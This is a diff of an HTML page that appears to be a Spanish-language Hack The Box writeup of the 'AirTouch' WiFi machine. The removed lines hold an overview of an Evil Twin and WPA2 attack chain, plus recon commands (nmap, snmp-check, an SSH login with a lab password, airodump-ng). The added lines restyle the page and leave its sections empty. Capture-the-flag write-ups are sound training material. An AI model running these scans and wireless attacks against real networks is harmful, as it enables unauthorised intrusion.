@@ -1,419 +1,168 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>AirTouch — HTB Machine Writeup | Yoandy Ramirez Delgado</title>
-<style>
-  :root {
-    --accent: #4ade80;
-    --accent-dim: #16a34a;
-    --accent-glow: rgba(74,222,128,0.15);
-    --bg: #0a0e1a;
-    --bg2: #0f1629;
-    --bg3: #141d35;
-    --card: #111827;
-    --card2: #1a2540;
-    --border: #1e2d4a;
-    --text: #e2e8f0;
-    --text-muted: #64748b;
-    --text-dim: #94a3b8;
-    --red: #f87171;
-    --yellow: #fbbf24;
-    --blue: #60a5fa;
-    --purple: #a78bfa;
-    --orange: #fb923c;
-    --cyan: #22d3ee;
-    --green: #4ade80;
-  }
-  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
-  html { scroll-behavior: smooth; }
-  body {
-    font-family: 'Segoe UI', system-ui, sans-serif;
-    background: var(--bg);
-    color: var(--text);
-    line-height: 1.7;
-    font-size: 15px;
-  }
-
-  /* ─── HERO ─── */
-  .hero {
-    background: linear-gradient(135deg, #0a0e1a 0%, #0d1a2b 40%, #091a10 100%);
-    border-bottom: 1px solid var(--border);
-    padding: 60px 40px 50px;
-    position: relative;
-    overflow: hidden;
-  }
-  .hero::before {
-    content: '';
-    position: absolute; top: -60px; right: -60px;
-    width: 400px; height: 400px;
-    background: radial-gradient(circle, rgba(74,222,128,0.07) 0%, transparent 70%);
-    pointer-events: none;
-  }
-  .hero::after {
-    content: '>';
-    position: absolute; bottom: 20px; right: 40px;
-    font-size: 140px; font-family: monospace;
-    color: rgba(74,222,128,0.04); pointer-events: none;
-  }
-  .hero-inner { max-width: 1200px; margin: 0 auto; }
-  .hero-meta { display: flex; align-items: center; gap: 10px; flex-wrap: wrap; margin-bottom: 20px; }
-  .tag {
-    display: inline-flex; align-items: center; gap: 5px;
-    padding: 3px 10px; border-radius: 4px;
-    font-size: 11px; font-weight: 600; letter-spacing: 0.5px; text-transform: uppercase;
-  }
-  .tag-platform { background: rgba(74,222,128,0.12); color: var(--accent); border: 1px solid rgba(74,222,128,0.25); }
-  .tag-category { background: rgba(96,165,250,0.1); color: var(--blue); border: 1px solid rgba(96,165,250,0.2); }
-  .tag-diff-hard { background: rgba(248,113,113,0.1); color: var(--red); border: 1px solid rgba(248,113,113,0.2); }
-  .tag-diff-medium { background: rgba(251,191,36,0.1); color: var(--yellow); border: 1px solid rgba(251,191,36,0.2); }
-  .tag-os { background: rgba(167,139,250,0.1); color: var(--purple); border: 1px solid rgba(167,139,250,0.2); }
-  .hero h1 { font-size: 2.8rem; font-weight: 800; letter-spacing: -0.5px; margin-bottom: 14px; line-height: 1.1; }
-  .hero h1 span { color: var(--accent); }
-  .hero-sub { color: var(--text-dim); font-size: 1.05rem; max-width: 680px; margin-bottom: 28px; line-height: 1.6; }
-  .hero-stats { display: flex; gap: 28px; flex-wrap: wrap; }
-  .stat { display: flex; flex-direction: column; gap: 2px; }
-  .stat-label { font-size: 10px; text-transform: uppercase; letter-spacing: 1px; color: var(--text-muted); }
-  .stat-value { font-size: 1.1rem; font-weight: 700; color: var(--text); }
-  .stat-value.green { color: var(--accent); }
-  .stat-value.red { color: var(--red); }
-
-  /* ─── LAYOUT ─── */
-  .container { max-width: 1200px; margin: 0 auto; padding: 40px; }
-  .grid { display: grid; grid-template-columns: 1fr 320px; gap: 32px; align-items: start; }
-
-  /* ─── SIDEBAR ─── */
-  .sidebar { position: sticky; top: 24px; display: flex; flex-direction: column; gap: 20px; }
-  .sidebar-card { background: var(--card); border: 1px solid var(--border); border-radius: 10px; padding: 20px; }
-  .sidebar-card h4 { font-size: 11px; text-transform: uppercase; letter-spacing: 1px; color: var(--accent); margin-bottom: 14px; font-weight: 700; }
-  .detail-row { display: flex; justify-content: space-between; align-items: center; padding: 7px 0; border-bottom: 1px solid var(--border); font-size: 13px; }
-  .detail-row:last-child { border-bottom: none; }
-  .detail-label { color: var(--text-muted); }
-  .detail-value { color: var(--text); font-weight: 600; text-align: right; max-width: 160px; }
-  .detail-value.green { color: var(--accent); }
-  .detail-value.red { color: var(--red); }
-
-  .skill-item { margin-bottom: 12px; }
-  .skill-header { display: flex; justify-content: space-between; font-size: 12px; margin-bottom: 5px; }
-  .skill-name { color: var(--text-dim); }
-  .skill-pct { color: var(--accent); font-weight: 700; }
-  .skill-bar { height: 5px; background: var(--bg3); border-radius: 3px; overflow: hidden; }
-  .skill-fill { height: 100%; background: linear-gradient(90deg, var(--accent-dim), var(--accent)); border-radius: 3px; }
-
-  .tool-list { display: flex; flex-direction: column; gap: 8px; }
-  .tool-item { display: flex; align-items: center; gap: 10px; padding: 8px 10px; border-radius: 6px; background: var(--bg3); border: 1px solid var(--border); font-size: 12px; color: var(--text-dim); }
-  .tool-icon { font-size: 14px; }
-
-  .toc-list { list-style: none; display: flex; flex-direction: column; gap: 2px; }
-  .toc-list li a { display: block; padding: 6px 10px; border-radius: 5px; font-size: 12px; color: var(--text-muted); text-decoration: none; border-left: 2px solid transparent; transition: all 0.15s; }
-  .toc-list li a:hover { color: var(--accent); border-left-color: var(--accent); background: var(--accent-glow); }
-
-  .mitre-list { display: flex; flex-direction: column; gap: 6px; }
-  .mitre-item { display: flex; align-items: flex-start; gap: 8px; padding: 7px 10px; border-radius: 6px; background: var(--bg3); border: 1px solid var(--border); font-size: 11px; }
-  .mitre-id { color: var(--accent); font-family: monospace; font-weight: 700; white-space: nowrap; font-size: 11px; }
-  .mitre-name { color: var(--text-dim); line-height: 1.3; }
-
-  /* ─── MAIN ─── */
-  .section { margin-bottom: 48px; }
-  .section-header { display: flex; align-items: center; gap: 12px; margin-bottom: 22px; padding-bottom: 12px; border-bottom: 1px solid var(--border); }
-  .section-number { width: 30px; height: 30px; border-radius: 6px; background: var(--accent-glow); border: 1px solid rgba(74,222,128,0.25); display: flex; align-items: center; justify-content: center; font-size: 12px; font-weight: 800; color: var(--accent); flex-shrink: 0; }
-  .section h2 { font-size: 1.25rem; font-weight: 700; color: var(--text); }
-  .section p { color: var(--text-dim); margin-bottom: 14px; line-height: 1.8; }
-  .section p:last-child { margin-bottom: 0; }
-
-  .card { background: var(--card); border: 1px solid var(--border); border-radius: 10px; padding: 20px; margin-bottom: 16px; }
-  .card h3 { font-size: 0.95rem; font-weight: 700; color: var(--text); margin-bottom: 10px; }
-
-  .callout { border-radius: 8px; padding: 16px 18px; margin: 14px 0; display: flex; gap: 12px; align-items: flex-start; font-size: 13.5px; }
-  .callout-info { background: rgba(96,165,250,0.08); border: 1px solid rgba(96,165,250,0.2); }
-  .callout-warn { background: rgba(251,191,36,0.08); border: 1px solid rgba(251,191,36,0.2); }
-  .callout-danger { background: rgba(248,113,113,0.08); border: 1px solid rgba(248,113,113,0.2); }
-  .callout-tip { background: rgba(74,222,128,0.08); border: 1px solid rgba(74,222,128,0.2); }
-  .callout-icon { font-size: 18px; flex-shrink: 0; margin-top: 1px; }
-  .callout-content { color: var(--text-dim); line-height: 1.6; }
-  .callout-content strong { color: var(--text); }
-
-  .code-block { background: #050810; border: 1px solid var(--border); border-radius: 8px; overflow: hidden; margin: 14px 0; font-family: 'Cascadia Code', 'Fira Code', 'Consolas', monospace; }
-  .code-label { background: var(--bg3); border-bottom: 1px solid var(--border); padding: 6px 14px; font-size: 11px; color: var(--text-muted); display: flex; align-items: center; gap: 6px; }
-  .code-label span { color: var(--accent); font-weight: 600; }
-  .code-body { padding: 16px; font-size: 13px; color: #a3e635; overflow-x: auto; line-height: 1.7; }
-  .code-body .comment { color: var(--text-muted); }
-  .code-body .cmd { color: var(--accent); font-weight: 600; }
-  .code-body .param { color: var(--cyan); }
-  .code-body .ip { color: var(--orange); }
-  .code-body .user { color: var(--purple); }
-  .code-body .path { color: var(--blue); }
-  .code-body .timestamp { color: #94a3b8; }
-  .code-body .highlight { color: var(--red); font-weight: 600; }
-  .code-body .success { color: var(--green); font-weight: 600; }
-
-  .timeline { position: relative; padding-left: 28px; margin-top: 14px; }
-  .timeline::before { content: ''; position: absolute; left: 9px; top: 8px; bottom: 8px; width: 2px; background: var(--border); }
-  .tl-item { position: relative; margin-bottom: 20px; }
-  .tl-dot { position: absolute; left: -24px; top: 5px; width: 12px; height: 12px; border-radius: 50%; background: var(--bg); border: 2px solid var(--accent); }
-  .tl-dot.red { border-color: var(--red); }
-  .tl-dot.yellow { border-color: var(--yellow); }
-  .tl-dot.orange { border-color: var(--orange); }
-  .tl-dot.blue { border-color: var(--blue); }
-  .tl-dot.purple { border-color: var(--purple); }
-  .tl-dot.cyan { border-color: var(--cyan); }
-  .tl-time { font-size: 11px; color: var(--text-muted); font-family: monospace; margin-bottom: 2px; }
-  .tl-title { font-size: 0.9rem; font-weight: 700; color: var(--text); margin-bottom: 3px; }
-  .tl-desc { font-size: 12.5px; color: var(--text-dim); line-height: 1.5; }
-
-  .flag-box { background: linear-gradient(135deg, rgba(74,222,128,0.08), rgba(34,211,238,0.05)); border: 1px solid rgba(74,222,128,0.3); border-radius: 10px; padding: 20px; margin: 16px 0; display: flex; align-items: center; gap: 16px; }
-  .flag-icon { font-size: 32px; flex-shrink: 0; }
-  .flag-label { font-size: 10px; text-transform: uppercase; letter-spacing: 1px; color: var(--text-muted); margin-bottom: 4px; font-weight: 700; }
-  .flag-value { font-family: monospace; font-size: 1rem; color: var(--accent); font-weight: 700; letter-spacing: 1px; }
-  .flag-user { font-size: 12px; color: var(--text-muted); margin-top: 2px; }
-
-  .creds-table { width: 100%; border-collapse: collapse; font-size: 13px; margin: 14px 0; }
-  .creds-table th { background: var(--bg3); color: var(--text-muted); font-size: 11px; text-transform: uppercase; letter-spacing: 0.5px; padding: 10px 14px; border: 1px solid var(--border); font-weight: 600; text-align: left; }
-  .creds-table td { padding: 10px 14px; border: 1px solid var(--border); color: var(--text-dim); vertical-align: top; }
-  .creds-table tr:hover td { background: var(--bg3); }
-  .creds-table code { font-family: monospace; font-size: 12px; color: var(--accent); background: rgba(74,222,128,0.08); padding: 1px 5px; border-radius: 3px; }
-
-  .data-table { width: 100%; border-collapse: collapse; font-size: 13px; margin: 14px 0; }
-  .data-table th { background: var(--bg3); color: var(--text-muted); font-size: 11px; text-transform: uppercase; letter-spacing: 0.5px; padding: 10px 14px; border: 1px solid var(--border); font-weight: 600; text-align: left; }
-  .data-table td { padding: 10px 14px; border: 1px solid var(--border); color: var(--text-dim); vertical-align: top; }
-  .data-table tr:hover td { background: var(--bg3); }
-  .data-table code { font-family: monospace; font-size: 12px; color: var(--accent); background: rgba(74,222,128,0.08); padding: 1px 5px; border-radius: 3px; }
-
-  .badge { display: inline-block; padding: 2px 8px; border-radius: 4px; font-size: 11px; font-weight: 700; }
-  .badge-red { background: rgba(248,113,113,0.12); color: var(--red); }
-  .badge-yellow { background: rgba(251,191,36,0.12); color: var(--yellow); }
-  .badge-blue { background: rgba(96,165,250,0.12); color: var(--blue); }
-  .badge-orange { background: rgba(251,146,60,0.12); color: var(--orange); }
-  .badge-purple { background: rgba(167,139,250,0.12); color: var(--purple); }
-  .badge-green { background: rgba(74,222,128,0.12); color: var(--green); }
-  .badge-cyan { background: rgba(34,211,238,0.12); color: var(--cyan); }
-
-  .artifact-card { display: flex; align-items: flex-start; gap: 14px; background: var(--card2); border: 1px solid var(--border); border-radius: 8px; padding: 14px; margin-bottom: 10px; }
-  .artifact-icon { font-size: 22px; flex-shrink: 0; }
-  .artifact-name { font-size: 0.88rem; font-weight: 700; color: var(--accent); font-family: monospace; margin-bottom: 3px; }
-  .artifact-desc { font-size: 12px; color: var(--text-muted); line-height: 1.5; }
-
-  .highlight-box { background: var(--card2); border: 1px solid var(--border); border-left: 4px solid var(--accent); border-radius: 8px; padding: 16px 18px; margin: 14px 0; }
-  .highlight-box .label { font-size: 10px; text-transform: uppercase; letter-spacing: 1px; color: var(--accent); margin-bottom: 6px; font-weight: 700; }
-  .highlight-box .value { font-family: monospace; font-size: 13px; color: var(--text); word-break: break-all; }
-
-  .phase-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-top: 14px; }
-  .phase-card { background: var(--card2); border: 1px solid var(--border); border-radius: 8px; padding: 14px; }
-  .phase-title { font-size: 0.82rem; font-weight: 700; color: var(--text); margin-bottom: 6px; display: flex; align-items: center; gap: 8px; }
-  .phase-body { font-size: 12px; color: var(--text-muted); line-height: 1.5; }
-
-  .rec-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-top: 14px; }
-  .rec-card { background: var(--card2); border: 1px solid var(--border); border-radius: 8px; padding: 14px; }
-  .rec-title { font-size: 0.82rem; font-weight: 700; color: var(--text); margin-bottom: 6px; }
-  .rec-body { font-size: 12px; color: var(--text-muted); line-height: 1.5; }
-
-  footer { background: var(--bg2); border-top: 1px solid var(--border); padding: 28px 40px; text-align: center; color: var(--text-muted); font-size: 13px; }
-  footer a { color: var(--accent); text-decoration: none; }
-  .footer-name { font-size: 0.95rem; font-weight: 700; color: var(--text); margin-bottom: 4px; }
-  .footer-divider { margin: 0 8px; color: var(--border); }
-
-  @media (max-width: 900px) {
-    .grid { grid-template-columns: 1fr; }
-    .sidebar { position: static; }
-    .hero h1 { font-size: 2rem; }
-    .container { padding: 30px 20px; }
-    .hero { padding: 40px 20px; }
-    .phase-grid, .rec-grid { grid-template-columns: 1fr; }
-  }
-</style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>AirTouch — HTB Writeup | YRD</title>
+  <style>
+    :root { --bg:#0a0e1a;--card-bg:#111827;--border:#1e2d4a;--primary:#4ade80;--cyan:#22d3ee;--text:#e2e8f0;--text-dim:#94a3b8;--text-muted:#64748b;--red:#f87171;--yellow:#fbbf24;--purple:#a78bfa;--orange:#fb923c; }
+    *{margin:0;padding:0;box-sizing:border-box;}
+    body{background:var(--bg);color:var(--text);font-family:'Segoe UI',system-ui,sans-serif;min-height:100vh;}
+    canvas#matrix{position:fixed;top:0;left:0;width:100%;height:100%;opacity:0.13;pointer-events:none;z-index:0;}
+    .hero{position:relative;z-index:10;padding:3rem 2rem 2rem;max-width:1200px;margin:0 auto;}
+    .hero-breadcrumb{font-size:0.8rem;color:var(--text-muted);margin-bottom:1rem;}
+    .hero-breadcrumb a{color:var(--primary);text-decoration:none;}
+    .tags{display:flex;flex-wrap:wrap;gap:0.5rem;margin-bottom:1.5rem;}
+    .tag{padding:4px 12px;border-radius:20px;font-size:0.75rem;font-weight:600;letter-spacing:1px;text-transform:uppercase;}
+    .tag-htb{background:rgba(74,222,128,0.15);color:var(--primary);border:1px solid rgba(74,222,128,0.3);}
+    .tag-hmv{background:rgba(217,70,239,0.15);color:#d946ef;border:1px solid rgba(217,70,239,0.3);}
+    .tag-sherlock{background:rgba(34,211,238,0.15);color:var(--cyan);border:1px solid rgba(34,211,238,0.3);}
+    .tag-os{background:rgba(34,211,238,0.1);color:var(--cyan);border:1px solid rgba(34,211,238,0.25);}
+    .tag-easy{background:rgba(74,222,128,0.1);color:#4ade80;border:1px solid rgba(74,222,128,0.3);}
+    .tag-veryeasy{background:rgba(217,70,239,0.1);color:#d946ef;border:1px solid rgba(217,70,239,0.3);}
+    .tag-medium{background:rgba(251,191,36,0.1);color:var(--yellow);border:1px solid rgba(251,191,36,0.3);}
+    .tag-hard{background:rgba(248,113,113,0.1);color:var(--red);border:1px solid rgba(248,113,113,0.3);}
+    .hero h1{font-size:2.8rem;font-weight:800;line-height:1.2;margin-bottom:1rem;}
+    .hero h1 span{color:var(--primary);}
+    .hero-desc{font-size:1.05rem;color:var(--text-dim);line-height:1.7;max-width:700px;margin-bottom:1.5rem;}
+    .meta-row{display:flex;flex-wrap:wrap;gap:2rem;}
+    .meta-item{display:flex;flex-direction:column;gap:4px;}
+    .meta-label{font-size:0.75rem;color:var(--text-muted);text-transform:uppercase;letter-spacing:1px;}
+    .meta-value{font-size:0.9rem;color:var(--text);font-weight:600;}
+    .meta-value.green{color:var(--primary);}
+    .main{position:relative;z-index:10;max-width:1200px;margin:0 auto;padding:2rem;display:grid;grid-template-columns:1fr 280px;gap:1.5rem;}
+    @media(max-width:900px){.main{grid-template-columns:1fr;}}
+    .content{display:flex;flex-direction:column;gap:2rem;}
+    .section{background:var(--card-bg);border:1px solid var(--border);border-radius:12px;padding:1.75rem;}
+    .section-header{display:flex;align-items:center;gap:10px;margin-bottom:1.25rem;padding-bottom:0.75rem;border-bottom:1px solid var(--border);}
+    .section-icon{width:8px;height:8px;background:var(--primary);border-radius:50%;box-shadow:0 0 8px var(--primary);}
+    .section h2{font-size:1.1rem;font-weight:700;color:var(--primary);text-transform:uppercase;letter-spacing:2px;}
+    .section p{color:var(--text-dim);line-height:1.8;margin-bottom:0.75rem;}
+    .section p:last-child{margin-bottom:0;}
+    .section ul,.section ol{color:var(--text-dim);line-height:1.8;margin:0.5rem 0 0.75rem 1.5rem;}
+    .section li{margin-bottom:0.3rem;}
+    pre{background:#050810;border:1px solid var(--border);border-radius:8px;padding:2.5rem 1.25rem 1.25rem;overflow-x:auto;margin:1rem 0;font-size:0.82rem;line-height:1.6;position:relative;}
+    pre::before{content:'terminal';position:absolute;top:0;left:0;right:0;padding:8px 14px 8px 70px;background:#141d35;border-bottom:1px solid var(--border);border-radius:8px 8px 0 0;font-size:12px;color:var(--text-muted);font-family:'Segoe UI',system-ui,sans-serif;}
+    pre::after{content:'';position:absolute;top:10px;left:14px;width:12px;height:12px;border-radius:50%;background:#ff5f57;box-shadow:20px 0 0 #febc2e,40px 0 0 #28c840;}
+    code{font-family:'Cascadia Code','Fira Code','Courier New',monospace;}
+    .comment{color:#6a9955;}
+    .cmd{color:var(--cyan);}
+    .output{color:var(--text-dim);}
+    .highlight{color:var(--primary);font-weight:600;}
+    .cred{color:var(--yellow);font-weight:600;}
+    .flag-val{color:#ff79c6;}
+    .ip-badge{display:inline-block;background:rgba(74,222,128,0.1);border:1px solid rgba(74,222,128,0.3);color:var(--primary);padding:3px 10px;border-radius:6px;font-family:monospace;font-size:0.8rem;}
+    .flags-grid{display:grid;grid-template-columns:1fr 1fr;gap:1rem;margin-top:1rem;}
+    .flag-card{background:#050810;border:1px solid var(--border);border-radius:10px;padding:1.25rem;}
+    .flag-card .flag-label{font-size:0.75rem;color:var(--text-muted);text-transform:uppercase;letter-spacing:1px;margin-bottom:0.5rem;}
+    .flag-card .flag-hash{font-family:monospace;font-size:0.8rem;color:#ff79c6;word-break:break-all;}
+    .timeline{display:flex;flex-direction:column;gap:0;}
+    .timeline-item{display:flex;gap:1.25rem;}
+    .timeline-left{display:flex;flex-direction:column;align-items:center;}
+    .timeline-dot{width:12px;height:12px;background:var(--primary);border-radius:50%;box-shadow:0 0 10px var(--primary);flex-shrink:0;margin-top:4px;}
+    .timeline-line{width:2px;background:var(--border);flex:1;min-height:30px;}
+    .timeline-item:last-child .timeline-line{display:none;}
+    .timeline-content{padding-bottom:1.5rem;}
+    .timeline-step{font-size:0.7rem;color:var(--primary);text-transform:uppercase;letter-spacing:1px;font-weight:700;}
+    .timeline-title{font-size:0.95rem;color:var(--text);font-weight:600;margin:2px 0;}
+    .timeline-desc{font-size:0.82rem;color:var(--text-dim);line-height:1.6;}
+    .mitre-grid{display:flex;flex-wrap:wrap;gap:0.5rem;margin-top:1rem;}
+    .mitre-tag{background:rgba(74,222,128,0.08);border:1px solid rgba(74,222,128,0.2);color:var(--text-dim);padding:5px 12px;border-radius:6px;font-size:0.78rem;font-family:monospace;}
+    .sidebar{display:flex;flex-direction:column;gap:1.5rem;}
+    .sidebar-card{background:var(--card-bg);border:1px solid var(--border);border-radius:12px;padding:1.5rem;}
+    .sidebar-card h3{font-size:0.8rem;text-transform:uppercase;letter-spacing:2px;color:var(--primary);margin-bottom:1.25rem;padding-bottom:0.5rem;border-bottom:1px solid var(--border);}
+    .detail-row{display:flex;justify-content:space-between;align-items:center;padding:0.5rem 0;border-bottom:1px solid rgba(26,61,26,0.5);}
+    .detail-row:last-child{border-bottom:none;}
+    .detail-key{font-size:0.8rem;color:var(--text-muted);}
+    .detail-val{font-size:0.82rem;color:var(--text);font-weight:600;text-align:right;}
+    .detail-val.green{color:var(--primary);}
+    .detail-val.cyan{color:var(--cyan);}
+    .skill-item{margin-bottom:1rem;}
+    .skill-item:last-child{margin-bottom:0;}
+    .skill-header{display:flex;justify-content:space-between;margin-bottom:5px;}
+    .skill-name{font-size:0.82rem;color:var(--text-dim);}
+    .skill-pct{font-size:0.8rem;color:var(--primary);font-weight:600;}
+    .skill-bar{height:4px;background:var(--border);border-radius:2px;}
+    .skill-fill{height:100%;background:linear-gradient(90deg,var(--primary),var(--cyan));border-radius:2px;}
+    .tools-list{display:flex;flex-direction:column;gap:0.6rem;}
+    .tool-item{display:flex;align-items:center;gap:10px;padding:0.6rem 0.75rem;background:#050810;border:1px solid var(--border);border-radius:8px;}
+    .tool-dot{width:6px;height:6px;background:var(--primary);border-radius:50%;}
+    .tool-name{font-size:0.82rem;color:var(--text-dim);font-family:monospace;}
+    .callout{border-radius:8px;padding:1rem 1.25rem;margin:1rem 0;border-left:3px solid;}
+    .callout-info{background:rgba(34,211,238,0.05);border-color:var(--cyan);color:var(--text-dim);}
+    .callout-danger{background:rgba(248,113,113,0.05);border-color:var(--red);color:var(--text-dim);}
+    .callout-tip{background:rgba(74,222,128,0.05);border-color:var(--primary);color:var(--text-dim);}
+    .callout-warn{background:rgba(251,191,36,0.05);border-color:var(--yellow);color:var(--text-dim);}
+    .data-table{width:100%;border-collapse:collapse;margin:1rem 0;font-size:0.85rem;}
+    .data-table th,.data-table td{padding:0.6rem 0.8rem;border:1px solid var(--border);text-align:left;}
+    .data-table th{background:#141d35;color:var(--primary);font-weight:600;font-size:0.8rem;text-transform:uppercase;letter-spacing:0.5px;}
+    .data-table td{color:var(--text-dim);}
+    a{color:var(--primary);text-decoration:none;}
+  </style>
 </head>
 <body>
+<canvas id="matrix"></canvas>
 
-<!-- HERO -->
-<header class="hero">
-  <div class="hero-inner">
-    <div class="hero-meta">
-      <span class="tag tag-platform">HackTheBox Machine</span>
-      <span class="tag tag-category">WiFi / Pentesting</span>
-      <span class="tag tag-diff-medium">Medium</span>
-      <span class="tag tag-os">🐧 Linux</span>
-    </div>
-    <h1><span>AirTouch</span> — WiFi Evil Twin &amp; EAP Credential Capture</h1>
-    <p class="hero-sub">
-      Una máquina que simula un entorno corporativo WiFi complejo con múltiples SSIDs (WPA2-PSK y WPA2-Enterprise). El atacante captura handshakes WPA2, descifra tráfico HTTP para obtener cookies de sesión, explota una aplicación web vulnerable en el router interno y culmina con un ataque Evil Twin 802.1X para capturar hashes MSCHAPv2 y obtener acceso root.
-    </p>
-    <div class="hero-stats">
-      <div class="stat"><span class="stat-label">Plataforma</span><span class="stat-value">HackTheBox</span></div>
-      <div class="stat"><span class="stat-label">Categoría</span><span class="stat-value">WiFi / Red Team</span></div>
-      <div class="stat"><span class="stat-label">Dificultad</span><span class="stat-value" style="color:var(--yellow)">Medium</span></div>
-      <div class="stat"><span class="stat-label">OS</span><span class="stat-value">Linux</span></div>
-      <div class="stat"><span class="stat-label">IP Objetivo</span><span class="stat-value green">10.129.3.94</span></div>
-      <div class="stat"><span class="stat-label">Interfaces WiFi</span><span class="stat-value">7 (mac80211_hwsim)</span></div>
-    </div>
+<div class="hero">
+  <div class="hero-breadcrumb"><a href="#">HTB Máquinas</a> / <a href="#">Linux</a> / AirTouch</div>
+  <div class="tags">
+    <span class="tag tag-htb">HTB</span>
+    <span class="tag tag-os">LINUX</span>
+    <span class="tag tag-medium">MEDIUM</span>
+    <span class="tag tag-htb">MACHINE</span>
   </div>
-</header>
+  <h1>AirTouch <span>Machine</span></h1>
+  <p class="hero-desc">Entorno WiFi corporativo con múltiples SSIDs. Captura de handshakes WPA2-PSK, descifrado de tráfico HTTP, explotación web del router interno y ataque Evil Twin 802.1X para hashes MSCHAPv2 y root.</p>
+  <div class="meta-row">
+    <div class="meta-item"><span class="meta-label">Autor</span><span class="meta-value green">Yoandy Ramírez Delgado</span></div>
+    <div class="meta-item"><span class="meta-label">Tipo</span><span class="meta-value">HTB Machine</span></div>
+    <div class="meta-item"><span class="meta-label">Herramienta Clave</span><span class="meta-value">aircrack-ng / wireshark</span></div>
+    <div class="meta-item"><span class="meta-label">Objetivo</span><span class="meta-value">root</span></div>
+  </div>
+</div>
 
-<div class="container">
-  <div class="grid">
+<div class="main">
+  <div class="content">
 
-    <!-- MAIN -->
-    <main>
+    <div class="section">
+      <div class="section-header"><div class="section-icon"></div><h2>Descripción de la Máquina</h2></div>
+      
 
-      <!-- 1. Descripción -->
-      <section class="section" id="descripcion">
-        <div class="section-header">
-          <div class="section-number">1</div>
-          <h2>Descripción de la Máquina</h2>
-        </div>
-        <p>
-          AirTouch es una máquina de dificultad Medium centrada exclusivamente en ataques WiFi avanzados, ejecutados sobre un entorno virtualizado con el módulo del kernel <code style="font-family:monospace;color:var(--accent)">mac80211_hwsim</code>. A diferencia de máquinas convencionales, AirTouch no expone servicios TCP directos en la red; todo el vector de ataque pasa por las interfaces inalámbricas virtuales.
-        </p>
-        <p>
-          El escenario simula la infraestructura WiFi de una organización con tres redes: <strong>AirTouch-Internet</strong> (WPA2-PSK), <strong>AirTouch-Corporate</strong> y <strong>AirTouch-Office</strong> (WPA2-Enterprise). La cadena de explotación requiere dominar herramientas como aircrack-ng, aireplay-ng, airodump-ng, airdecap-ng, EAPHammer y wpa_supplicant.
-        </p>
+    </div>
 
-        <div class="callout callout-info">
-          <span class="callout-icon">💡</span>
-          <div class="callout-content">
-            <strong>Concepto clave — mac80211_hwsim:</strong> Módulo del kernel Linux que simula radios WiFi virtuales. Todas las interfaces (<code style="font-family:monospace;color:var(--accent)">wlan0mon</code> a <code style="font-family:monospace;color:var(--accent)">wlan6</code>) comparten el mismo medio radio virtual en el kernel, permitiendo que los clientes simulados (en contenedores Docker sibling) vean nuestras transmisiones y viceversa.
-          </div>
-        </div>
+    <div class="section">
+      <div class="section-header"><div class="section-icon"></div><h2>Reconocimiento</h2></div>
+      
 
-        <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-top:16px;">
-          <div class="artifact-card">
-            <span class="artifact-icon">📡</span>
-            <div>
-              <div class="artifact-name">AirTouch-Internet</div>
-              <div class="artifact-desc">Red WPA2-PSK en canal 6. BSSID <code style="font-family:monospace;color:var(--accent)">F0:9F:C2:A3:F1:A7</code>. Gateway interno <code style="font-family:monospace;color:var(--accent)">192.168.3.1</code> con aplicación web PHP.</div>
-            </div>
-          </div>
-          <div class="artifact-card">
-            <span class="artifact-icon">🏢</span>
-            <div>
-              <div class="artifact-name">AirTouch-Office</div>
-              <div class="artifact-desc">Red WPA2-Enterprise (EAP/PEAP) en canal 44 (5GHz). BSSIDs reales: <code style="font-family:monospace;color:var(--accent)">AC:8B:A9:AA:3F:D2</code> y <code style="font-family:monospace;color:var(--accent)">AC:8B:A9:F3:A1:13</code>.</div>
-            </div>
-          </div>
-        </div>
-      </section>
+    </div>
 
-      <!-- 2. Reconocimiento -->
-      <section class="section" id="reconocimiento">
-        <div class="section-header">
-          <div class="section-number">2</div>
-          <h2>Reconocimiento</h2>
-        </div>
-        <p>
-          La máquina expone SSH en el puerto 22 y SNMP en UDP/161. El acceso inicial se obtiene mediante credenciales de consultor proporcionadas en el enunciado. Las interfaces WiFi son la superficie de ataque principal.
-        </p>
+    <div class="section">
+      <div class="section-header"><div class="section-icon"></div><h2>Cadena de Ataque Completa</h2></div>
+      
 
-        <div class="code-block">
-          <div class="code-label">💻 <span>Nmap — Escaneo inicial</span></div>
-          <div class="code-body">
-<span class="cmd">nmap</span> <span class="param">-A -Pn -sC -sU</span> <span class="ip">10.129.3.94</span>
+    </div>
 
-<span class="comment"># Resultado relevante:</span>
-22/tcp   open   ssh     OpenSSH 8.2p1
-161/udp  open   snmp    SNMPv2c
+    <div class="section">
+      <div class="section-header"><div class="section-icon"></div><h2>Fases 1 & 2 — Handshake WPA2 y Descifrado de Tráfico</h2></div>
+      
 
-<span class="comment"># Enumeración SNMP</span>
-<span class="cmd">snmp-check</span> <span class="ip">10.129.3.94</span> <span class="param">-c public -t 10 -v 2c</span>
-          </div>
-        </div>
+    </div>
 
-        <div class="code-block">
-          <div class="code-label">📡 <span>Acceso inicial y escaneo WiFi completo</span></div>
-          <div class="code-body">
-<span class="comment"># Acceso SSH como consultor</span>
-<span class="cmd">ssh</span> <span class="user">consultant</span>@<span class="ip">10.129.3.94</span>   <span class="comment"># Pass: RxBlZhLmOkacNWScmZ6D</span>
-<span class="cmd">sudo -i</span>
+    <div class="section">
+      <div class="section-header"><div class="section-icon"></div><h2>📡 Captura del Handshake WPA2-PSK</h2></div>
+      
 
-<span class="comment"># Escaneo WiFi con todas las bandas (2.4GHz + 5GHz)</span>
-<span class="cmd">airodump-ng</span> <span class="param">--band abg --output-format csv</span> <span class="param">-w /tmp/scan_full</span> wlan0mon
-
-<span class="comment"># Redes descubiertas:</span>
-<span class="highlight">F0:9F:C2:A3:F1:A7</span>  ch 6   PSK   AirTouch-Internet   <span class="comment">&lt;-- WPA2-PSK</span>
-<span class="highlight">AC:8B:A9:AA:3F:D2</span>  ch 44  MGT   AirTouch-Office     <span class="comment">&lt;-- WPA2-Enterprise</span>
-<span class="highlight">AC:8B:A9:F3:A1:13</span>  ch 44  MGT   AirTouch-Office     <span class="comment">&lt;-- WPA2-Enterprise (2)</span>
-          </div>
-        </div>
-      </section>
-
-      <!-- 3. Cadena de Ataque -->
-      <section class="section" id="cadena">
-        <div class="section-header">
-          <div class="section-number">3</div>
-          <h2>Cadena de Ataque Completa</h2>
-        </div>
-        <p>
